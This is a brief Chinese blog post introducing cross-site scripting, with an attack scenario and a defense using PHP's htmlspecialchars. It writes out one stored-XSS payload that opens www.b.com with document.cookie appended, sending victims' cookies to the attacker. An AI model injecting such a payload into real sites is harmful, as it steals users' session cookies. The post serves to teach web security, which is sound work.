+++
title = "常见的web安全问题"
date = "2015-12-25T21:35:06+08:00"
tags = ["other"]
author = "xiaojiong"

+++

### XSS
XSS攻击：跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。其原理是攻击者向有XSS漏洞的网站中输入(传入)恶意的HTML代码，当其它用户浏览该网站时，这段HTML代码会自动执行，从而达到攻击的目的。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。

### XSS攻击
a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，

```
<script>window.open(“www.b.com?param=”+document.cookie)</script>
```

保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。

### XSS防御
永远不要相信用户传过来的数据
php可以使用htmlspecialchars函数，将html标签转义。

```
<?php
    htmlspecialchars();
```

